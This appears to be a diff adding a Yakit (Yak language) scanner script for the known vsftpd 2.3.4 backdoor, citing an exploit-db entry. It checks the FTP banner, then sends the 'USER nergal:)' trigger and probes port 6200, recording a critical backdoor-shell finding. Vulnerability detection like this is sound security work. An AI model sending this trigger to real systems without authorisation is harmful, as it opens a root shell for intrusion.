@@ -1,0 +1,58 @@
+loglevel("info")
+
+// https://www.exploit-db.com/exploits/49757
+vsftpd = func(host, port) {
+    addr = str.HostPort(host, port)
+    conn, err = tcp.Connect(host, port)
+    die(err)
+    defer conn.Close()
+
+    // res = io.ReadStable(conn, 3)
+    res, _ = conn.RecvTimeout(2)
+    if !str.MatchAllOfRegexp(res, `(?i)220\s+\(vsftpd\s+\d+\.\d(\.\d+)*\)`, `2\.3\.4`) {
+        return
+    }
+
+    dump(res)
+
+    yakit.Info("start to check vsftpd:6200 backdoor port")
+    conn6200, err := tcp.Connect(host, 6200, tcp.clientTimeout(5))
+    if err == nil {
+        risk.NewRisk(
+            addr, risk.severity("critical"), 
+            risk.type("backdoor-shell"), risk.typeVerbose("后门 Shell"),
+            risk.title("vsftpd backdoor: " + addr),
+            risk.titleVerbose("vsftpd 后门 Shell: " + addr),
+        )
+        yakit.Info("VSFTPD 6200 backdoor detected")
+        conn6200.Close()
+        return
+    }
+
+    yakit.Info("start to check USER nergal:)\\r\\n")
+    conn.Send("USER nergal:)\r\n")
+    // res = io.ReadStable(conn, 3)
+    res, _ = conn.RecvTimeout(2)
+    if !str.HasPrefix(string(res), "331") {
+        return
+    }
+
+    conn.Send("PASS pass\r\n")
+    yakit.Info("waiting 6200 backdoor")
+    sleep(3)
+    
+    conn6200, err = tcp.Connect(host, 6200, tcp.clientTimeout(5))
+    die(err)
+
+    risk.NewRisk(
+        addr, risk.severity("critical"), 
+        risk.type("backdoor-shell"), risk.typeVerbose("后门 Shell"),
+        risk.title("vsftpd backdoor: " + addr),
+        risk.titleVerbose("vsftpd 后门 Shell: " + addr),
+    )
+    conn6200.Close()
+}
+
+if YAK_MAIN {
+    vsftpd(cli.String("target"), cli.Int("port"))
+}
